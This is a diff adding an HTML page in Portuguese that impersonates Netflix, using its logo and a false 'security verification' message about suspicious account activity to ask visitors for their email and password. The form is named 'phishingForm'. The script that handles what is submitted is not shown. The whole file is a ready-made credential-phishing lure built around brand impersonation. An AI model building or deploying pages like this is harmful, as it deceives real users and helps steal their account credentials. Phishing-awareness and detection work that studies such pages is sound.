@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Verificação de Conta</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
+        </div>
+        
+        <div class="form-container">
+            <h1>Verificação de Segurança</h1>
+            <p>Sua conta foi identificada em uma atividade suspeita. Por favor, verifique suas credenciais:</p>
+            
+            <form id="phishingForm">
+                <div class="input-group">
+                    <label>Email ou telefone</label>
+                    <input type="email" id="email" placeholder="exemplo@email.com" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>Senha</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                
+                <button type="submit" class="submit-btn">Verificar Agora</button>
+            </form>
+            
+            <div id="status" class="status hidden"></div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
